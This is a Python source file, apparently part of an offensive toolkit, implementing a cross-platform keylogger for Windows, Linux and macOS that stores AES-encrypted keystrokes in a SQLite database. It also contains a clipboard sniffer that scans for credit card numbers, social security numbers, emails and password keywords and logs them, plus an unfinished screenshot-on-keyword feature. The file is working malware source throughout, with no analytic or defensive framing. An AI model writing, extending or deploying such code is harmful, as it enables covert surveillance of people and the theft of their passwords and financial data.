import os
import sys
import threading
import time
import sqlite3
import traceback
from pathlib import Path
import platform
import re
from PIL import ImageGrab

from modules.logger import log_event
from modules.config import load_config

cfg = load_config().get("keylogger", {})
LOG_INTERVAL = cfg.get("log_interval", 300)
DB_PATH = cfg.get("db_path", "/opt/bismillah_repo/keystrokes.db")

# AES‐GCM key and nonce for encrypting keystrokes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
KEY = bytes.fromhex(load_config().get("logging", {}).get("aes_key", "")[:64])
NONCE = bytes.fromhex(load_config().get("logging", {}).get("aes_iv", "")[:24])[:12]

# Platform flags
IS_WIN = sys.platform == "win32"
IS_MAC = sys.platform == "darwin"
IS_LIN = sys.platform.startswith("linux")

def _ensure_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("""
    CREATE TABLE IF NOT EXISTS keys (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp INTEGER,
        keystroke BLOB
    )
    """)
    conn.commit()
    conn.close()

def _encrypt_keystroke(text: str) -> bytes:
    aesgcm = AESGCM(KEY)
    return aesgcm.encrypt(NONCE, text.encode(errors="ignore"), None)

# Windows Keylogger
if IS_WIN:
    import pythoncom
    import pyWinhook as pyhook
    import win32con

    class WindowsKeyLogger:
        def __init__(self):
            self.hm = pyhook.HookManager()
            self.hm.KeyDown = self.on_key
            self.hm.HookKeyboard()

        def on_key(self, event):
            try:
                char = chr(event.Ascii)
            except:
                char = f"[{event.Key}]"
            data = _encrypt_keystroke(char)
            ts = int(time.time())
            conn = sqlite3.connect(DB_PATH)
            conn.execute("INSERT INTO keys (timestamp, keystroke) VALUES (?, ?)", (ts, data))
            conn.commit()
            conn.close()
            return True

        def start(self):
            import pythoncom
            pythoncom.PumpMessages()

# Linux Keylogger (evdev)
elif IS_LIN:
    from evdev import InputDevice, categorize, ecodes, list_devices

    class LinuxKeyLogger:
        def __init__(self):
            self.devices = []
            for dev_path in list_devices():
                dev = InputDevice(dev_path)
                if 'keyboard' in dev.name.lower() or 'event' in dev.name.lower():
                    self.devices.append(dev)

        def start(self):
            for dev in self.devices:
                threading.Thread(target=self.listen, args=(dev,), daemon=True).start()

        def listen(self, dev):
            for event in dev.read_loop():
                if event.type == ecodes.EV_KEY and event.value == 1:
                    key = categorize(event)
                    text = key.keycode if isinstance(key.keycode, str) else str(key.keycode)
                    data = _encrypt_keystroke(text)
                    ts = int(time.time())
                    conn = sqlite3.connect(DB_PATH)
                    conn.execute("INSERT INTO keys (timestamp, keystroke) VALUES (?, ?)", (ts, data))
                    conn.commit()
                    conn.close()

# macOS Keylogger (Quartz)
elif IS_MAC:
    from AppKit import NSApplication
    from PyObjCTools import AppHelper
    import Quartz

    class MacOSKeyLogger:
        def __init__(self):
            self.event_mask = Quartz.kCGEventMaskForAllEvents()
            self.tap = Quartz.CGEventTapCreate(
                Quartz.kCGHIDEventTap,
                Quartz.kCGHeadInsertEventTap,
                Quartz.kCGEventTapOptionDefault,
                Quartz.CGEventMaskBit(Quartz.kCGEventKeyDown),
                self.callback,
                None
            )
            self.run_loop_source = Quartz.CFMachPortCreateRunLoopSource(None, self.tap, 0)
            Quartz.CFRunLoopAddSource(
                Quartz.CFRunLoopGetCurrent(),
                self.run_loop_source,
                Quartz.kCFRunLoopCommonModes
            )
            Quartz.CGEventTapEnable(self.tap, True)

        def callback(self, proxy, type_, event, refcon):
            keycode = Quartz.CGEventGetIntegerValueField(event, Quartz.kCGKeyboardEventKeycode)
            text = str(keycode)
            data = _encrypt_keystroke(text)
            ts = int(time.time())
            conn = sqlite3.connect(DB_PATH)
            conn.execute("INSERT INTO keys (timestamp, keystroke) VALUES (?, ?)", (ts, data))
            conn.commit()
            conn.close()
            return event

        def start(self):
            AppHelper.runConsoleEventLoop()

def keylogger_loop():
    _ensure_db()
    try:
        if IS_WIN:
            kl = WindowsKeyLogger()
            log_event("keylogger", b"Starting Windows keylogger.")
            kl.start()
        elif IS_LIN:
            kl = LinuxKeyLogger()
            log_event("keylogger", b"Starting Linux keylogger.")
            kl.start()
        elif IS_MAC:
            kl = MacOSKeyLogger()
            log_event("keylogger", b"Starting macOS keylogger.")
            kl.start()
    except Exception as e:
        tb = traceback.format_exc()
        log_event("keylogger", f"Keylogger error: {tb}".encode())

def clipboard_sniffer(db_path: str):
    """Monitor clipboard for sensitive data"""
    def get_clipboard():
        try:
            if platform.system() == "Windows":
                import win32clipboard
                win32clipboard.OpenClipboard()
                data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                return data
            elif platform.system() == "Darwin":
                import subprocess
                result = subprocess.run(['pbpaste'], capture_output=True, text=True)
                return result.stdout
            else:
                import subprocess
                result = subprocess.run(['xclip', '-selection', 'clipboard', '-o'], 
                                      capture_output=True, text=True)
                return result.stdout
        except Exception:
            return ""
    
    def is_sensitive_data(text):
        # Check for passwords, credit cards, etc.
        patterns = [
            r'\b\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}\b',  # Credit card
            r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',  # Email
            r'\b\d{3}-\d{2}-\d{4}\b',  # SSN
            r'password|passwd|secret|key|token',  # Keywords
        ]
        
        for pattern in patterns:
            if re.search(pattern, text, re.IGNORECASE):
                return True
        return False
    
    while True:
        try:
            clipboard_data = get_clipboard()
            if clipboard_data and is_sensitive_data(clipboard_data):
                log_event("keylogger", f"Clipboard sensitive data: {clipboard_data[:100]}".encode())
        except Exception as e:
            log_event("keylogger", f"Clipboard sniffer error: {e}".encode())
        
        time.sleep(5)

def screen_capture_on_keyword(db_path: str, keyword: str):
    """Take screenshot when keyword is typed"""
    def take_screenshot():
        try:
            screenshot = ImageGrab.grab()
            timestamp = int(time.time())
            filename = f"/tmp/screenshot_{timestamp}.png"
            screenshot.save(filename)
            log_event("keylogger", f"Screenshot saved: {filename}".encode())
            return filename
        except Exception as e:
            log_event("keylogger", f"Screenshot error: {e}".encode())
            return None
    
    # Monitor for keyword in keystrokes
    keyword_buffer = ""
    
    def check_keyword(key):
        nonlocal keyword_buffer
        keyword_buffer += key.lower()
        if len(keyword_buffer) > len(keyword):
            keyword_buffer = keyword_buffer[-len(keyword):]
        
        if keyword.lower() in keyword_buffer:
            take_screenshot()
            keyword_buffer = ""
    
    # This would integrate with the existing keylogger
    # For now, just log the functionality
    log_event("keylogger", f"Screen capture on keyword '{keyword}' enabled".encode())
